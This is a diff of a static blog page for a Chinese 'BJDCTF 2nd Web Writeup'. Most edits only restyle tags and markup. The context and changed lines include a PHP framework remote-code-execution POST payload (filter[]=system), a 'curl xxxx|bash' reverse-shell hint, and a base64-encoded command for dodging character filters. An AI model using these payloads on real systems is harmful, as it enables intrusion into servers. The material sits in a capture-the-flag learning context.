@@ -83,7 +83,7 @@
 <link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="CTF,writeup," />
+  <meta name="keywords" content="CTF,Writeup," />
 
 
 
@@ -110,7 +110,7 @@
 
 
 <meta name="description" content="上周末BJD第二场，又是一届新生赛，尽管如此还是暴露出了很多问题。这段时间就先把这次总结出来的问题解决一下。">
-<meta name="keywords" content="CTF, writeup">
+<meta name="keywords" content="CTF, Writeup">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BJDCTF 2nd Web Writeup">
 <meta property="og:url" content="http://localhost:4000/writeups/2020/03/23/BJDCTF-2nd-Web/">
@@ -363,8 +363,8 @@
               
                 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/category/#/writeups" itemprop="url" rel="index">
-                    <span itemprop="name">writeups</span>
+                  <a href="/category/#/Writeups" itemprop="url" rel="index">
+                    <span itemprop="name">Writeups</span>
                   </a>
                 </span>
 
@@ -565,14 +565,7 @@ POST：_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /f
 
 <ol>
   <li>
-    <table>
-      <tbody>
-        <tr>
-          <td>后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx</td>
-          <td>bash弹Shell，然后find一下flag。</td>
-        </tr>
-      </tbody>
-    </table>
+    <p>后来看题解，发现我好像非预期了，.bash_history是个意外，预期思路应该是用nc命令或者curl xxxx|bash弹Shell，然后find一下flag。</p>
   </li>
   <li>
     <p>因为find命令会返回不止一行，而我的方法是利用了system()的返回，所以不太好用。当然也不是不可以，可以先将find的返回保存到变量foo中，然后echo一下${foo}。至于”$”符号的绕过，可以先将命令base64编码，传到服务器再解码，然后重定向到bash里，Payload大概长这样：</p>
@@ -582,7 +575,9 @@ POST：_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=cat /f
  YT0kKGZpbmQgLyAtbmFtZSBmbGFnKTtlY2hvICR7YToxMDoxNX18YmFzZTY0Cg== =&gt; a=$(find / -name flag);echo ${a:10:15}|base64
 </code></pre></td></tr></tbody></table></div>    </div>
   </li>
-  <li>不得不说，上面这个方法太蛋疼了，得整一个VPS工具。</li>
+  <li>
+    <p>不得不说，上面这个方法太蛋疼了，得整一个VPS工具。</p>
+  </li>
 </ol>
 
 <hr />
@@ -1119,7 +1114,7 @@ Forecast success rate 7.564358188440272%
             <a href="/tag/#/CTF" rel="tag"># CTF</a>
           
             
-            <a href="/tag/#/writeup" rel="tag"># writeup</a>
+            <a href="/tag/#/Writeup" rel="tag"># Writeup</a>
           
         </div>
       
@@ -1235,7 +1230,7 @@ Forecast success rate 7.564358188440272%
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">2</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -1246,7 +1241,7 @@ Forecast success rate 7.564358188440272%
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/">
-                <span class="site-state-item-count">15</span>
+                <span class="site-state-item-count">14</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
